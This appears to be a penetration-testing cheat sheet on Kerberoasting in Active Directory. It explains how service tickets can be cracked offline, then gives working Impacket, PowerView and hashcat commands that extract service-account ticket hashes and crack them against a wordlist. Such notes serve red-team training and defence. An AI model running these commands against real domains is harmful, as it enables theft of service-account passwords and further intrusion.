# Kerberoasting

## Overview

Kerberoasting is a post-exploitation attack technique used to extract service account credentials in Active Directory (AD) environments. It targets the way Kerberos, the authentication protocol used in AD, handles service tickets for accounts configured to use Service Principal Names (SPNs).

When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the service name (sname) of the service wanted. If the TGT is valid, and if the service exists, the KDC sends the ST to the requesting user.

The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password.

In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. This is Kerberoasting.

## Kerberoast no pre-authentication

If an attacker knows of an account for which pre-authentication isn't required (i.e. an ASREProastable account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).


## Attack Requirements

- An authenticated user with a valid TGT

or

- An ASREProastable account
- The SPNS (service names)

## Attack Result

A TST to attempt to be cracked offline. If we crack the ticket we will have the password of the service.


## Attack Execution

### With Impacket

```
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip <domain_controller_ip> '<domain>/<username>:<password>'
```

### With Impacket  - no pre authentication

```
GetUserSPNs.py -no-preauth "<username>" -usersfile "<file_with_services_names>.txt" -dc-host "<domain_controller_ip>" "<domain_name>"/
```


### With PowerView

First search for users with SPN property

    Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName 

Then extract the hash for cracking

    Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Do to all users with spn:

```powershell
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```
```shell
#then prepare file for hashcat
cat ilfreight_spns.csv | cut -d ',' -f 8 | python3 -c "import sys; [print(line.strip()) for line in sys.stdin]" | awk '{print substr($0,2,length($0)-2)}'
#finally run hashcat
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
```

### Other Information

    https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
    https://www.thehacker.recipes/ad/movement/kerberos/kerberoast